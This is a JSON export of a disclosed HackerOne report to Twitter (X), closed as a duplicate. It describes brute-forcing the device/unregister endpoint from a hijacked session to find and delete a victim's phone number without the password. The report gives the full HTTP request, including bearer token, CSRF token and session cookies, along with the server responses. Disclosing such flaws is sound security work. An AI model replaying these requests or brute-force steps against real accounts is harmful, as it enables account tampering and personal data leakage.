{
  "id": 1087525,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDg3NTI1",
  "url": "https://hackerone.com/reports/1087525",
  "title": "PI leakage By Brute Forcing and Phone number deleting without using password",
  "state": "Closed",
  "substate": "duplicate",
  "severity_rating": "medium",
  "readable_substate": "Duplicate",
  "created_at": "2021-01-26T13:57:48.995Z",
  "submitted_at": "2021-01-26T13:57:49.038Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "a13h1",
    "url": "/a13h1",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/m47al6ttiyx1ndmqxuwdehnhjq1m/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 61,
    "url": "https://hackerone.com/x",
    "handle": "x",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "X (Formerly Twitter)",
      "twitter_handle": "XSecurity",
      "website": "https://x.com",
      "about": "X helps you create and share ideas and information instantly, without barriers."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-04-22T16:35:16.872Z",
  "bug_reporter_agreed_on_going_public_at": "2021-04-21T14:29:35.746Z",
  "team_member_agreed_on_going_public_at": "2021-04-22T16:35:16.759Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:** This additional security measure from twitter provides protection to the victim's account, considering that a victim's session may have been hijacked by a hacker, however, due to this additional layer of security Implemented by twitter the hacker would not be able to disclose the victim's Phone Number and cannot remove(delete the phone number), as they will be prompted to enter the victim's account password In order to make these changes, which will not be known to a hacker (In case of a session hijack)\n\nThis report is to bring to your attention a security vulnerability that will allow hackers that have hijacked a user's session to bypass the password screen (Without knowing the user's password)\n\n##Description:\n For users that have had their twitter session hijacked, this security vulnerability would enable a hacker to disclose the Phone Number (Personal Info)or able to remove the victim Phone number \n\nSo this issue is leads to PI leakage by bypassing the password authentication because in twitter we need to enter the password to get into the account setting and deleting the phone number\n\n\n\n## Steps To Reproduce:\n\n1.  Use the below request to regenerate the issue\n\nPOST /i/api/1.1/device/unregister.json HTTP/1.1\nHost: twitter.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://twitter.com/settings/phone\nauthorization: Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA\nx-twitter-auth-type: OAuth2Session\nx-twitter-client-language: en\nx-twitter-active-user: yes\ncontent-type: application/x-www-form-urlencoded\nx-csrf-token: ff2ffbac7022086cf6f9b8bd5bab1db0867608a86f29c36a07e5098e77c933a63d6b58040a5431c783d0405c6cd0bcc6db33c23fd40b2355717fd3461986c117083941cca395e2268be2fe1ff1d0d01f\nContent-Length: 28\nOrigin: https://twitter.com\nConnection: close\nCookie: _ga=GA1.2.1934906781.1600634518; kdt=RJzTVzAyG9tYDKN1JYYBTY6qxuvSoarrK4gl5Yjn; remember_checked_on=1; _gid=GA1.2.1680084220.1611590216; mbox=session#52f0077eb7804a2395f66b219d53df8c#1611676575; at_check=true; lang=en; cd_user_id=1773f4d2a7ea-0e8308a702e6d88-31634645-1fa400-1773f4d2a7f2; gt=1354060492269096960; personalization_id=\"v1_viWq+tRogA+gdH7F6rki9A==\"; guest_id=v1%3A161166820124545510; ct0=ff2ffbac7022086cf6f9b8bd5bab1db0867608a86f29c36a07e5098e77c933a63d6b58040a5431c783d0405c6cd0bcc6db33c23fd40b2355717fd3461986c117083941cca395e2268be2fe1ff1d0d01f; ads_prefs=\"HBERAAA=\"; _twitter_sess=BAh7CiIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCC426T53AToJdXNlcmwr%250ACQEA1xjqWMkSOgxjc3JmX2lkIiUxODg2NDcwZWNkMWY4YWU5NTVjNWNiZDg3%250ANDRmMDc0NjoHaWQiJWNjMzgzNWU2NDQxNDkzYjFjZWY2YmMzODA3MGYwOGUy--96dc661c5411d47c03c4c09292e4a42610a0b24e; twid=u%3D1353710925463879681; auth_token=9b17ab39756e101001234f6b59e278775f3fdc15\n\nphone_number=%2B919999999906\n\n\n2.  We have victim session hijacked account so we replace some headers and cookie in above request \n\n3.  We didn't know the Phone number so we are place some random number in phone_number parameter\n\n4. Then start brute forcing so their is no rate limit here \n\n5. See the POC for more clearification  F1172750\n\n6. The request we use is generate from the hacker personal account we just change  authorization: Bearer , x-csrf-token , cookie by the victim session \n\nas you see in POC \n\nIf the response is come in 404 the phone number is not true and it didn't get delete\n\nHTTP/1.1 404 Not Found\ncache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0\nconnection: close\ncontent-disposition: attachment; filename=json.json\nContent-Length: 64\ncontent-type: application/json; charset=utf-8\ndate: Tue, 26 Jan 2021 13:41:46 GMT\nexpires: Tue, 31 Mar 1981 05:00:00 GMT\nlast-modified: Tue, 26 Jan 2021 13:41:46 GMT\npragma: no-cache\nserver: tsa_o\nstatus: 404 Not Found\nstrict-transport-security: max-age=631138519\nx-client-event-enabled: true\nx-connection-hash: a429bf26b4a46c4d3bc600f80ac11ffe\nx-content-type-options: nosniff\nx-frame-options: SAMEORIGIN\nx-response-time: 124\nx-transaction: 00849dce003bcaed\nx-tsa-request-body-time: 1\nx-twitter-response-tags: BouncerCompliant\nx-xss-protection: 0\n\n{\"errors\":[{\"code\":157,\"message\":\"Verified device not found.\"}]}\n\n\nIf the response comes in 200 that means the phone number is true and the phone number is deleted from the account\n\nHTTP/1.1 200 OK\ncache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0\nconnection: close\ncontent-disposition: attachment; filename=json.json\ncontent-length: 0\ncontent-type: application/json;charset=utf-8\ndate: Tue, 26 Jan 2021 13:47:42 GMT\nexpires: Tue, 31 Mar 1981 05:00:00 GMT\nlast-modified: Tue, 26 Jan 2021 13:47:42 GMT\npragma: no-cache\nserver: tsa_o\nstatus: 200 OK\nstrict-transport-security: max-age=631138519\nx-access-level: read-write-directmessages\nx-client-event-enabled: true\nx-connection-hash: fbc3dbbec5096ecf1194cec8aecb4d71\nx-content-type-options: nosniff\nx-frame-options: SAMEORIGIN\nx-response-time: 155\nx-transaction: 00e5c7150079403a\nx-tsa-request-body-time: 0\nx-twitter-response-tags: BouncerCompliant\nx-xss-protection: 0\n\n\nAnd if the response came 200 the hacker see the payload phone number which is relative to the user Personal info which is disclose \n\nand for all these we didn't need any password authentication\n\n## Impact\n\nThe impact is the hacker didn't need any password to delete the  phone number and get the phone number of victim by brute forcing \nSo this issue is leads to PI leakage by bypassing the password authentication\n\nThanks",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": 167833,
  "original_report_url": "https://hackerone.com/reports/167833",
  "attachments": [
    {
      "id": 1172750,
      "file_name": "twitter.mp4",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dmpj5djfyj9jcxugfv5jv1qq1a88?response-content-disposition=attachment%3B%20filename%3D%22twitter.mp4%22%3B%20filename%2A%3DUTF-8%27%27twitter.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6K7XUSGS%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T140436Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA5oUTkOsy%2B%2BNZW%2FsEPkxVR9Nn0bKUQajhMaZJnQUOJJAiBNVU4iwU4izaH0MK0tElopJO3KoogTT8%2FbdWX%2FkbKzuyqyBQh2EAMaDDAxMzYxOTI3NDg0OSIMERsjeYIiXpoQB0OmKo8FUViIVri3eJCOgeD2QGMLKPs4F1%2FjbhNffMNUt%2BfvAGSphgvZY2tU246xkvKwwDTX6TnzUNLh3iGOcuouArS3RIWbEfHSiDDu6%2BVZPx3Wz1I%2FCwS%2BKPH5NwJsBp0BibvHEHHji%2FALBDiXO8PioToytjyaEQNaXmQuLAn84CAb4QekxzofZnprn52iHUoXFyJNf%2Fq3ZqvA4jb30mJAxCPIjnPde1tkpNSGuAfsmY%2ByQYlN7sWxpq5yV%2BTU%2Bz0rt1WjtctGsd6w1yt88Dd%2Br74P8m7ROn2Z0ptQw5A%2BWNmX1Wanb7ILpRxe8QeaZaokqgxiSrVfnWtNKgnVUga2Z0moK4hOWv539koLmT4PBBuxJlSyZWyeMoBemGmSCiOxOKwmrf%2BCK%2FG1BpNYsaCmjPVr2A49O9rh48uqEFc8uvejj87y8pQoGWAlFjsxe1QzTC0haaEIYGygiAnZI6IKmy2%2BNlrPwjgcdHQnc15lnYbAokFqg1uW1UzqkUE4c44dN5JbBhzJaJz14CGqvz2LbrkrxeapW3SunevCGGfJdcClV%2F0zJwxxOPm7TYbX7PHfVKaL7pLvGt6ShxVaeJzf1nAj8m2nfGj9L5WdfZ6Sb9aD7w08GXkqVBejxqPrEzu%2Fin49ua4mt8x0hItGe5i0jUq8p%2BuZQ93zKwP09dFgsV6qPlGtXKwW1fddd9jt%2Bnnp1fwfIxbu4spfYa8nFjzgPqH7T%2F%2FJQgaw6dXm%2Fi4%2FblBIP3pX1Sf8fOovW1YithPw4Jt%2FdibdeIaKPPXUhJeeypNj7zindWYEDmbdjQ6xKgYfOTCGv3Kveuz%2BrIe58j5hhTO6SOGM5oLaEPjukGlkwR0S6pSULxstSwXhSCM4K2grCjC%2Fvq2uBjqyASBnlNoKKu8wzQ1P%2F0BlH14PlBBt%2Fm%2BFzSC4hnyN21lioiA3qg372zbcFqxrMin8PkMDjYnDERYVShxZWmk7L62lyLmDmK6ddoZeeuZn0a%2BBvBT61yW5%2Fafe16Wi38LTWHakxXOTJqfqznIB1OO6RKIWbBpba3WDGpf5V64%2B0hKThL7teXpfRzoD3U%2BjQs%2B7q62Fy7YrQ7qeIWla%2FIkEaOKDajC8wFKHIsPw6ZwsIvBIndQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2b57df9615b3df1422d22a0fa80e54846cbeb623242ceeb2c4bcb31397671f1a",
      "file_size": 9605876,
      "type": "video/mp4",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 13,
  "voters": [
    "arthuraires",
    "ali",
    "aliasgg",
    "akashhamal0x01",
    "0nlymohammed",
    "h4x0r_dz",
    "recon_ninja",
    "a13h1",
    "ragingoblin",
    "meispi",
    "and 3 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 1062,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.twitter.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
